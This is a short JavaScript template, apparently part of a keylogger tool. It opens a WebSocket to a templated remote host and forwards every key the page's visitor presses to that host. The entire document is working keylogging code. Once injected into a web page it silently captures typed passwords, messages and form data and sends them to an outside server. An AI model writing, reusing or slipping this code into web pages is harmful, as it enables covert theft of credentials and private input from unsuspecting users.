(function () {
  const conn = new WebSocket("ws://{{.}}/ws");
  document.onkeydown = keypress;
  function keypress(evt) {
    conn.send(evt.key);
  }
})();
